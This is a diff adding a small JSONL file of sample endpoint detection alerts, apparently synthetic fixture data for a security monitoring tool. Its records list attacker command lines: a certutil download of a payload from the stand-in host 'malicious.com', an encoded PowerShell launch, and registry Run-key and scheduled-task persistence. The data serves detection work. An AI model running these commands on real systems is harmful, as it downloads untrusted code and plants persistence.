@@ -1,0 +1,5 @@
+{"detection_id": "lc_001", "rule_name": "Living off the Land Binary Abuse", "host": "ENDPOINT-SALES", "process": "certutil.exe", "command_line": "certutil -urlcache -split -f http://malicious.com/payload.exe", "severity": "critical", "timestamp": 1724428500}
+{"detection_id": "lc_002", "rule_name": "Fileless Malware Execution", "host": "LAPTOP-FINANCE", "process": "powershell.exe", "command_line": "powershell -enc SQBuAHYAbwBrAGUAL...", "severity": "high", "timestamp": 1724428650}
+{"detection_id": "lc_003", "rule_name": "Registry Persistence Mechanism", "host": "SERVER-EXCHANGE", "process": "reg.exe", "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "severity": "medium", "timestamp": 1724428800}
+{"detection_id": "lc_004", "rule_name": "Scheduled Task for Persistence", "host": "WORKSTATION-IT", "process": "schtasks.exe", "command_line": "schtasks /create /tn UpdateCheck /sc daily", "severity": "medium", "timestamp": 1724428950}
+{"detection_id": "lc_005", "rule_name": "Network Discovery via ARP", "host": "CONTRACTOR-LAPTOP", "process": "arp.exe", "command_line": "arp -a", "severity": "low", "timestamp": 1724429100}
